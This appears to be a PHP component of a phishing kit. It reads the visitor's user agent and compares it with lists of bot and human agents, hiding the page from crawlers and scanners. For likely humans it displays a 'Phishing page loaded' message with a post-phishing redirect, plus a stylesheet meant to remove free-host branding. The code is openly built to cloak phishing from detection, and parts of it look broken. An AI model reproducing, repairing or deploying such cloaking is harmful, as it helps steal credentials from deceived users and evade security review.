<?php
include('.././other/user_agent_list.php');
include('./phishing_info/'.basename(__FILE__));

if(!empty($_SERVER['HTTP_USER_AGENT'])){
$u = strtolower($_SERVER['HTTP_USER_AGENT']);
//bots user-agents normally
if((substr_count($b[0],$u)+substr_count($b[1],$u)+substr_count($b[2],$u)+substr_count($b[3],$u)+substr_count($b[4],$u)+substr_count($b[5],$u)+substr_count($b[6],$u)+substr_count($b[7],$u)+substr_count($b[8],$u)+substr_count($b[9],$u)+substr_count($b[10],$u)+substr_count($b[11],$u)+substr_count($b[12],$u)+substr_count($b[13],$u)+substr_count($b[14],$u)+substr_count($b[15],$u))<='0' ){ 	


//human user-agents normally
if((substr_count($h[0],$u)+substr_count($h[1],$u)+substr_count($h[2],$u)+substr_count($h[3],$u)+substr_count($h[4],$u)+substr_count($h[5],$u)+substr_count($h[6],$u)+substr_count($h[7],$u)+substr_count($h[8],$u)+substr_count($h[9],$u)+substr_count($h[10],$u)+substr_count($h[11],$u)+substr_count($h[12],$u)+substr_count($h[13],$u)+substr_count($h[14],$u)+substr_count($h[15],$u)+substr_count($h[16],$u)+substr_count($h[17],$u)+substr_count($h[18],$u)+substr_count($h[19],$u)+substr_count($h[20],$u)+substr_count($h[21],$u))<='1' ){	


echo'<link rel=stylesheet type=text/css href="./remove branding logo/000webhost.css">';

echo'<center><h1>Some words in your <mark>user_agent</mark> matched with our list. Thus Phishing page loaded. Else content will not be displayed. Your <mark>user_agent</mark> is listed below:- <br>$ua<br>You will be redirected to this link after phishing: $redirect</h1></center>';

/*
<input type=hidden name=link value='.$redirect.'>
<input type=hidden name=location value=Sample />
*/
}}}
?>
